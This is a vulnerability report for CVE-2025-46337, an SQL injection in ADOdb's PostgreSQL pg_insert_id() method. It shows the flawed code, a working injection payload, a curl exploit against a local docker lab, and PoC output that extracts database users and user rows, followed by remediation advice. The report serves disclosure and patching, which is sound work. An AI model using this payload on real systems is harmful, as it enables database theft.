# CVE-2025-46337 Vulnerability Report

## Vulnerability Information

- **CVE ID**: CVE-2025-46337
- **CWE ID**: CWE-89 (SQL Injection)
- **CVSS Score**: 10.0 (Critical)
- **Affected Software**: ADOdb < 5.22.9
- **Affected Component**: PostgreSQL driver `pg_insert_id()` method

## Root Cause Analysis

The vulnerability exists in `drivers/adodb-postgres64.inc.php`:

```php
function pg_insert_id($tablename,$fieldname) {
    $result=pg_query($this->_connectionID, 
        'SELECT last_value FROM '. $tablename .'_'. $fieldname .'_seq');
    ...
}
```

The `$tablename` and `$fieldname` parameters are directly concatenated into the SQL query without proper escaping, allowing attackers to inject arbitrary SQL statements.

## Attack Vector

An attacker can inject malicious SQL by manipulating the `table` parameter:

**Payload Example**:
```
table=(SELECT version() as last_value) t--
field=x
```

This results in the following SQL query:
```sql
SELECT last_value FROM (SELECT version() as last_value) t--_x_seq
```

## Exploitation Steps

1. Start the vulnerable environment:
```bash
docker-compose up -d --build
```

2. Send a malicious request:
```bash
curl "http://localhost:8080/api.php?table=(SELECT%20version()%20as%20last_value)%20t--&field=x"
```

3. Observe the extracted PostgreSQL version in the response.

## Proof of Concept Results

```
[*] Target: http://localhost:8080
[*] Testing CVE-2025-46337 - ADOdb PostgreSQL SQL Injection

[*] Step 1: Testing normal request...
[+] Normal response: {"table":"users","field":"id","last_insert_id":"2"}

[*] Step 2: Testing SQL injection to extract PostgreSQL version...
[!] VULNERABLE! PostgreSQL version extracted: PostgreSQL 15.15 on x86_64-pc-linux-musl

[*] Step 3: Extracting database users...
[!] Database user: postgres

[*] Step 4: Extracting current database name...
[!] Current database: testdb

[*] Step 5: Extracting table names...
[!] Tables: users

[*] Step 6: Extracting data from users table...
[!] Users data: admin:admin@example.com, test:test@example.com
```

## Impact

- **Confidentiality**: High - Attackers can read arbitrary data from the database
- **Integrity**: High - Attackers can modify or delete data
- **Availability**: Low - Potential DoS via resource exhaustion

## Remediation

Upgrade ADOdb to version 5.22.9 or later. If upgrading is not possible:

1. Only pass controlled data to `pg_insert_id()` method
2. Escape user input using `pg_escape_identifier()`:
```php
$fieldname = pg_escape_identifier($user_input);
$insert_id = $adodb->pg_insert_id($tablename, $fieldname);
```

## References

- https://github.com/ADOdb/ADOdb/security/advisories/GHSA-8x27-jwjr-8545
- https://github.com/ADOdb/ADOdb/commit/11107d6d6e5160b62e05dff8a3a2678cf0e3a426
